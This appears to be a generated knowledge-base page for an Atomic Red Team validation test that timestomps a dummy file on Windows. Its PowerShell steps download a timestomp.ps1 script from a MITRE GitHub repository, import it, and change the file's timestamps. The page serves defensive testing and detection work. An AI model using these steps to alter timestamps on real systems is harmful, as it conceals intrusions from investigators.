---
atomic_guid: "d7512c33-3a75-4806-9893-69abc3ccdd43"
title: "Windows - Timestomp a File"
framework: "atomic"
generated: "true"
attack_technique_id: "T1070.006"
attack_technique_name: "Indicator Removal on Host: Timestomp"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1070.006/T1070.006.yaml"
build_date: "2026-04-26 17:02:12"
executor: "powershell"
aliases:
  - "d7512c33-3a75-4806-9893-69abc3ccdd43"
  - "Windows - Timestomp a File"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Windows - Timestomp a File

Timestomp kxwn.lock.

Successful execution will include the placement of kxwn.lock in #{file_path} and execution of timestomp.ps1 to modify the time of the .lock file. 

[Mitre ATT&CK Evals](https://github.com/mitre-attack/attack-arsenal/blob/master/adversary_emulation/APT29/CALDERA_DIY/evals/data/abilities/defensive-evasion/4a2ad84e-a93a-4b2e-b1f0-c354d6a41278.yml)

## Metadata

- Atomic GUID: d7512c33-3a75-4806-9893-69abc3ccdd43
- Technique: T1070.006: Indicator Removal on Host: Timestomp
- Platforms: windows
- Executor: powershell
- Dependency Executor: powershell
- Source Path: atomics/T1070.006/T1070.006.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1070-indicator_removal|T1070.006]]

## Input Arguments

### file_path

- description: File path for timestomp payload
- type: string
- default: PathToAtomicsFolder\..\ExternalPayloads

## Dependencies

timestomp.ps1 must be present in #{file_path}.

### Prerequisite Check

```powershell
if (Test-Path "#{file_path}\timestomp.ps1") {exit 0} else {exit 1}
```

### Get Prerequisite

```powershell
Invoke-WebRequest "https://raw.githubusercontent.com/mitre-attack/attack-arsenal/bc0ba1d88d026396939b6816de608cb279bfd489/adversary_emulation/APT29/CALDERA_DIY/evals/payloads/timestomp.ps1" -OutFile "#{file_path}\timestomp.ps1"
```

kxwn.lock must be present in #{file_path}.

### Prerequisite Check

```powershell
if (Test-Path -path "#{file_path}\kxwn.lock") {exit 0} else {exit 1}
```

### Get Prerequisite

```powershell
New-Item -Path "#{file_path}\kxwn.lock" -ItemType File
```

## Executor

- name: powershell

### Command

```powershell
import-module "#{file_path}\timestomp.ps1"
timestomp -dest "#{file_path}\kxwn.lock"
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1070.006/T1070.006.yaml)
